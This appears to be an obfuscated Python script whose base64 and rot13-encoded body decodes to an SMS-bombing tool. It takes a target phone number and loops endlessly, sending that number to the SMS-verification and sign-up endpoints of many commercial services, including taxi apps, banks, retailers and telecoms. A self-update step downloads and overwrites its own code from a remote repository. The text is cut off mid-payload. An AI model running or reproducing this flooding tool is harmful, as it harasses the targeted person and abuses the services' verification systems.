# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLCByYW5kb20sIGRhdGV0aW1lLCBzeXMsIHRpbWUsIGFyZ3BhcnNlLCBvcwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlLCBCYWNrLCBTdHlsZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbXBvcnQgYmFzZTY0CmluaXQoKQoKCmRlZiBzaHV0ZG93bihzaWduYWwsIGZyYW1lKToKICAgIHByaW50ICgnXG5cMDMzWzE7MzFtQ3RybCtDIHdhcyBwcmVzc2VkLCBzaHV0dGluZyBkb3duIVwwMzNbMG0nKQogICAgc3lzLmV4aXQoKQoKZGVmIGNoZWNraW50ZXJuZXQoKToKICAgIHJlcyA9IEZhbHNlCiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5nb29nbGUuY29tJywgdmVyaWZ5PVRydWUpCiAgICAgICAgcmVzID0gRmFsc2UKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmVzID0gVHJ1ZQogICAgaWYgcmVzOgogICAgICAgIHByaW50KCJcblxuXHRJdCBzZWVtcyBUaGF0IFlvdXIgSW50ZXJuZXQgU3BlZWQgaXMgU2xvdyBvciBZb3UgQXJlIFVzaW5nIFByb3hpZXMuLiIpCiAgICAgICAgYmFubmVyKCkKICAgICAgICBleGl0KCkKCnRyeToKICAgIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20nKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcHJpbnQoIllvdSBhcmUgbm90IGNvbm5lY3RlZCBUbyBJbnRlcm5ldCEhISIpCiAgICBwcmludCgiXHRQbGVhc2UgQ29ubmVjdCBUbyBJbnRlcm5ldCBUbyBDb250aW51ZS4uLlxuIikKICAgIGlucHV0KCdFeGl0aW5nLi4uLlxuIFByZXNzIEVudGVyIFRvIENvbnRpbnVlLi4uLicpCiAgICBleGl0KCkKCnByaW50KCdcdENoZWNraW5nIEZvciBVcGRhdGVzLi4uJykKdmVyID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigKICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLy52ZXJzaW9uIikucmVhZCgpLmRlY29kZSgndXRmLTgnKQp2ZXJsID0gJycKdHJ5OgogICAgdmVybCA9IG9wZW4oIi52ZXJzaW9uIiwgJ3InKS5yZWFkKCkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHBhc3MKaWYgdmVyICE9IHZlcmw6CiAgICBwcmludCgnXG5cdFx0QW4gVXBkYXRlIGlzIEF2YWlsYWJsZS4uLi4nKQogICAgcHJpbnQoJ1x0U3RhcnRpbmcgVXBkYXRlLi4uJykKICAgIHVwZGF0ZSgpCnByaW50KCJZb3VyIFZlcnNpb24gaXMgVXBkYXRlISIpCnRyeToKICAgIG5vdGkgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLy5ub3RpZnkiKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICBub3RpID0gbm90aS51cHBlcigpLnN0cmlwKCkKICAgIGlmIGxlbihub3RpKSA+IDEwOgogICAgICAgIHByaW50KCdcblxuXHQgTWVzc2FnZSA6ICAnICsgbm90aSArICdcblxuJykKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHBhc3MKZGVmIHVwZGF0ZSgpOgogICAgc3R1ZmZfdG9fdXBkYXRlID0gWydkZW1vLnB5JywgJy52ZXJzaW9uJ10KICAgIGZvciBmbCBpbiBzdHVmZl90b191cGRhdGU6CiAgICAgICAgZGF0ID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigKICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L1JlYm9ybi9tYXN0ZXIvIiArIGZsKS5yZWFkKCkKICAgICAgICBmaWxlID0gb3BlbihmbCwgJ3diJykKICAgICAgICBmaWxlLndyaXRlKGRhdCkKICAgICAgICBmaWxlLmNsb3NlKCkKICAgIHByaW50KCdcblx0XHRVcGRhdGVkIFN1Y2Nlc3NmdWxsICEhISEnKQogICAgcHJpbnQoJ1x0UGxlYXNlIFJ1biBUaGUgU2NyaXB0IEFnYWluLi4uJykKICAgIGV4aXQoKQoKZmlyc3QgPSBpbnB1dCAoIkVudGVyIFRhcmdldCBOdW1iZXIgLS0tPiAiKQpvcy5zeXN0ZW0oJ2NsZWFyJykKbnVtMSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9yZWFkZXIvbWFzdGVyL2EudHh0IikucmVhZCgpCnByaW50KCJTY2FubmluZyBWSVAgTnVtYmVycy4iKQpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQoIlNjYW5uaW5nIFZJUCBOdW1iZXJzLi4iKQpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQoIlNjYW5uaW5nIFZJUCBOdW1iZXJzLi4uIikKdGltZS5zbGVlcCgxKQpudW0yID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzRuYXQvcmVhZGVyL21hc3Rlci9iLnR4dCIpLnJlYWQoKQpkZWNvZGU9cHJpbnQoIkRlY29kaW5nLi4uLiIpCnRpbWUuc2xlZXAoMSkKdGVzdDE9aW50KGJhc2U2NC5iNjRkZWNvZGUobnVtMSkpCnByaW50KCJSZWFkaW5nLi4uLi4uIikKdGVzdDI9aW50KGJhc2U2NC5iNjRkZWNvZGUobnVtMikpCmlmIGludChmaXJzdCk9PXRlc3QxOnByaW50KCJUaGlzIE51bWJlciBQcm90ZWN0aW5nLi4uIik7ZXhpdCgpCmVsaWYgaW50KGZpcnN0KT09dGVzdDI6cHJpbnQoIlRoaXMgTnVtYmVyIFByb3RlY3RpbmcuLi4iKTtleGl0KCkKZWxzZTpvcy5zeXN0ZW0oJ2NsZWFyJykKX3Bob25lID0gaW5wdXQoIkVudGVyIFRhcmdldCBOdW1iZXIgQWdhaW4tLS0+IikKb3Muc3lzdGVtKCdjbGVhcicpCnRpbWUuc2xlZXAoMikKCgoKX25hbWUgPSAnJwpmb3IgeCBpbiByYW5nZSgxMik6CglfbmFtZSA9IF9uYW1lICsgcmFuZG9tLmNob2ljZShsaXN0KCcxMjM0NTY3ODlxd2VydHl1aW9wYXNkZmdoamtsenhjdmJubVFXRVJUWVVJT1BBU0RGR0hKS0xaWENWQk5NJykpCglwYXNzd29yZCA9IF9uYW1lICsgcmFuZG9tLmNob2ljZShsaXN0KCcxMjM0NTY3ODlxd2VydHl1aW9wYXNkZmdoamtsenhjdmJubVFXRVJUWVVJT1BBU0RGR0hKS0xaWENWQk5NJykpCgl1c2VybmFtZSA9IF9uYW1lICsgcmFuZG9tLmNob2ljZShsaXN0KCcxMjM0NTY3ODlxd2VydHl1aW9wYXNkZmdoamtsenhjdmJubVFXRVJUWVVJT1BBU0RGR0hKS0xaWENWQk5NJykpCgpfcGhvbmU5ID0gX3Bob25lWzE6XQpfcGhvbmVBcmVzQmFuayA9ICcrJytfcGhvbmVbMF0rJygnK19waG9uZVsxOjRdKycpJytfcGhvbmVbNDo3XSsnLScrX3Bob25lWzc6OV0rJy0nK19waG9uZVs5OjExXQpfcGhvbmU5ZG9zdGF2aXN0YSA9IF9waG9uZTlbOjNdKycrJytfcGhvbmU5WzM6Nl0rJy0nK19waG9uZTlbNjo4XSsnLScrX3Bob25lOVs4OjEwXQpfcGhvbmVPc3RpbiA9ICcrJytfcGhvbmVbMF0rJysoJytfcGhvbmVbMTo0XSsnKScrX3Bob25lWzQ6N10rJy0nK19waG9uZVs3OjldKyctJytfcGhvbmVbOToxMV0KX3Bob25lUGl6emFodXQgPSAnKycrX3Bob25lWzBdKycgKCcrX3Bob25lWzE6NF0rJykgJytfcGhvbmVbNDo3XSsnICcrX3Bob25lWzc6OV0rJyAnK19waG9uZVs5OjExXQpfcGhvbmVHb3J6ZHJhdiA9IF9waG9uZVsxOjRdKycpICcrX3Bob25lWzQ6N10rJy0nK19waG9uZVs3OjldKyctJytfcGhvbmVbOToxMV0KCgoKCgoKaXRlcmF0aW9uID0gMAoKCgp3aGlsZSBUcnVlOgoKCglfZW1haWwgPSBfbmFtZStmJ3tpdGVyYXRpb259JysnQGdtYWlsLmNvbScKCWVtYWlsID0gX25hbWUrZid7aXRlcmF0aW9ufScrJ0BnbWFpbC5jb20nCgl0cnk6CiAgICAgICAgICAgICAgICAKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3AuZ3JhYnRheGkuY29tL2FwaS9wYXNzZW5nZXIvdjIvcHJvZmlsZXMvcmVnaXN0ZXInLCBkYXRhPXsncGhvbmVOdW1iZXInOiBfcGhvbmUsJ2NvdW50cnlDb2RlJzogJ0lEJywnbmFtZSc6ICd0ZXN0JywnZW1haWwnOiAnbWFpbEBtYWlsLmNvbScsJ2RldmljZVRva2VuJzogJyonfSwgaGVhZGVycz17J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY2LjAuMzM1OS4xMTcg'
love = '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'
god = 'Lmludml0cm8ucnUvbGsyL2xrYS9wYXRpZW50L3JlZnJlc2hDb2RlJywgZGF0YT17J3Bob25lJzogX3Bob25lfSkKCQlwcmludCgnWytdIEludml0cm8gUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSW52aXRybyBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9vbmxpbmUuc2Jpcy5ydS9yZWcvc2VydmljZS8nLCBqc29uPXsnanNvbnJwYyc6JzIuMCcsJ3Byb3RvY29sJzonNScsJ21ldGhvZCc6J8ODwoPDgsKQw4PCgsOCwp/Dg8KDw4LCkMODwoLDgsK+w4PCg8OCwpDDg8KCw4LCu8ODwoPDgsKRw4PCgsOCwozDg8KDw4LCkMODwoLDgsK3w4PCg8OCwpDDg8KCw4LCvsODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpHDg8KCw4LCgsODwoPDgsKQw4PCgsOCwrXDg8KDw4LCkMODwoLDgsK7w4PCg8OCwpHDg8KCw4LCjC7Dg8KDw4LCkMODwoLDgsKXw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKRw4PCgsOCwo/Dg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCusODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsKdw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwqTDg8KDw4LCkMODwoLDgsK4w4PCg8OCwpDDg8KCw4LCt8ODwoPDgsKQw4PCgsOCwrjDg8KDw4LCkMODwoLDgsK6w4PCg8OCwpDDg8KCw4LCsCcsJ3BhcmFtcyc6eydwaG9uZSc6X3Bob25lfSwnaWQnOicxJ30pCgkJcHJpbnQoJ1srXSBTYmVyYmFuayBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBTYmVyYmFuayBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pYi5wc2JhbmsucnUvYXBpL2F1dGhlbnRpY2F0aW9uL2V4dGVuZGVkQ2xpZW50QXV0aFJlcXVlc3QnLCBqc29uPXsnZmlyc3ROYW1lJzonw4PCg8OCwpDDg8KCw4LCmMODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCvScsJ21pZGRsZU5hbWUnOifDg8KDw4LCkMODwoLDgsKYw4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsK9w4PCg8OCwpDDg8KCw4LCvsODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsK4w4PCg8OCwpHDg8KCw4LChycsJ2xhc3ROYW1lJzonw4PCg8OCwpDDg8KCw4LCmMODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCvcODwoPDgsKQw4PCgsOCwr7Dg8KDw4LCkMODwoLDgsKyJywnc2V4JzonMScsJ2JpcnRoRGF0ZSc6JzEwLjEwLjIwMDAnLCdtb2JpbGVQaG9uZSc6IF9waG9uZTksJ3J1c3NpYW5GZWRlcmF0aW9uUmVzaWRlbnQnOid0cnVlJywnaXNEU0EnOidmYWxzZScsJ3BlcnNvbmFsRGF0YVByb2Nlc3NpbmdBZ3JlZW1lbnQnOid0cnVlJywnYktJUmVxdWVzdEFncmVlbWVudCc6J251bGwnLCdwcm9tb3Rpb25BZ3JlZW1lbnQnOid0cnVlJ30pCgkJcHJpbnQoJ1srXSBQc2JhbmsgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gUHNiYW5rIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL215YXBpLmJlbHRlbGVjb20uYnkvYXBpL3YxL2F1dGgvY2hlY2stcGhvbmU/bGFuZz1ydScsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pCgkJcHJpbnQoJ1srXSBCZWx0ZWxjb20gUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gQmVsdGVsY29tIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwcC5rYXJ1c2VsLnJ1L2FwaS92MS9waG9uZS8nLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQoJCXByaW50KCdbK10gS2FydXNlbCBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBLYXJ1c2VsIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwcC1hcGkua2ZjLnJ1L2FwaS92MS9jb21tb24vYXV0aC9zZW5kLXZhbGlkYXRpb24tc21zJywganNvbj17J3Bob25lJzogJysnICsgX3Bob25lfSkKCQlwcmludCgnWytdIEtGQyBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBLRkMgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLmNhcnNtaWxlLmNvbS8iLGpzb249eyJvcGVyYXRpb25OYW1lIjogImVudGVyUGhvbmUiLCAidmFyaWFibGVzIjogeyJwaG9uZSI6IF9waG9uZX0sInF1ZXJ5IjogIm11dGF0aW9uIGVudGVyUGhvbmUoJHBob25lOiBTdHJpbmchKSB7XG4gIGVudGVyUGhvbmUocGhvbmU6ICRwaG9uZSlcbn1cbiJ9KQoJCXByaW50KCdbK10gY2Fyc21pbGUgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gY2Fyc21pbGUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmNpdGlsaW5rLnJ1L3JlZ2lzdHJhdGlvbi9jb25maXJtL3Bob25lLysnICsgX3Bob25lICsgJy8nKQoJCXByaW50KCdbK10gQ2l0aWxpbmsgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gQ2l0aWxpbmsgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vYXBpLmRlbGl0aW1lLnJ1L2FwaS92Mi9zaWdudXAiLGRhdGE9eyJTaWdudXBGb3JtW3VzZXJuYW1lXSI6IF9waG9uZSwgIlNpZ251cEZvcm1bZGV2aWNlX3R5cGVdIjogM30pCgkJcHJpbnQoJ1srXSBEZWxpdGltZSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBEZWxpdGltZSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMuZ2V0KCdodHRwczovL2ZpbmRjbG9uZS5ydS9yZWdpc3RlcicsIHBhcmFtcz17J3Bob25lJzogJysnICsgX3Bob25lfSkKCQlwcmludCgnWytdIGZpbmRjbG9uZSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBmaW5kY2xvbmUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmljcS5jb20vc21zcmVnL3JlcXVlc3RQaG9uZVZhbGlkYXRpb24ucGhwJyxkYXRhPXsnbXNpc2RuJzogX3Bob25lLCAibG9jYWxlIjogJ2VuJywgJ2NvdW50cnlDb2RlJzogJ3J1JywndmVyc2lvbic6ICcxJywgImsiOiAiaWMxcnR3ejFzMUhqMU8wciIsICJyIjogIjQ2NzYzIn0pCgkJcHJpbnQoJ1srXSBJQ1EgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSUNRIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL3RlcnJhLTEuaW5kcml2ZXJhcHAuY29tL2FwaS9hdXRob3JpemF0aW9uP2xvY2FsZT1ydSIsZGF0YT17Im1vZGUiOiAicmVxdWVzdCIsICJwaG9uZSI6ICIrIiArIF9waG9uZSwicGhvbmVfcGVybWlzc2lvbiI6ICJ1bmtub3duIiwgInN0cmVhbV9pZCI6IDAsICJ2IjogMywgImFwcHZlcnNpb24iOiAiMy4yMC42Iiwib3N2ZXJzaW9uIjogInVua25vd24iLCAiZGV2aWNlbW9kZWwiOiAidW5rbm93biJ9KQoJCXByaW50KCdbK10gSW5Ecml2ZXIgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSW5Ecml2ZXIgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vbGsuaW52aXRyby5ydS9zcC9tb2JpbGVBcGkvY3JlYXRlVXNlckJ5UGFzc3dvcmQiLCBkYXRhPXsicGFzc3dvcmQiOiBwYXNzd29yZCwgImFwcGxpY2F0aW9uIjogImxrcCIsICJsb2dpbiI6ICIrIiArIF9waG9uZX0pCgkJcHJpbnQoJ1srXSBJbnZpdHJvIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEludml0cm8gUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJ'
